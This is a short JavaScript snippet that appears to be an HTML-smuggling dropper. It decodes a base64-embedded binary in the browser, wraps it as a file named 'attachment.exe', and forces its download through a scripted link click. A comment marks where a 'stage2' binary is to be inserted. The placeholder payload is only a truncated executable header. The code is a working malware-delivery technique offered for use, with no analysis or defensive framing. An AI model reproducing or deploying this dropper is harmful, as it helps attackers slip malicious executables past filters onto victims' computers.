function to_blob(b64_blob, chunk_size)
{
var payload = [];

var blob_bytes = atob(b64_blob);

for(var i = 0; i < blob_bytes.length; i += chunk_size)
{
var blob_chunk = blob_bytes.slice(i, i + chunk_size);
var b_array = new Array(blob_chunk.length);

for(var a = 0; a < blob_chunk.length; a++)
{
b_array[a] = blob_chunk.charCodeAt(a);
}

var uint_array = new Uint8Array(b_array);
payload.push(uint_array);
}

var out = new Blob(payload, {type: "octet/stream"});
return out;
}

function trigger(out)
{
let fd = new File([out], "attachment.exe", {type: "octet/stream"});
let fd_url = URL["createObjectURL"](fd);
var a = document.createElement("a");
document.body.appendChild(a);

a.setAttribute("href",fd_url);
a.download = 'attachment.exe';
a.click();
URL.revokeObjectURL(fd_url);
}
// Insert base64 encoded stage2 binary here
var b64_blob = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=';
var out = to_blob(b64_blob, 512);
trigger(out);
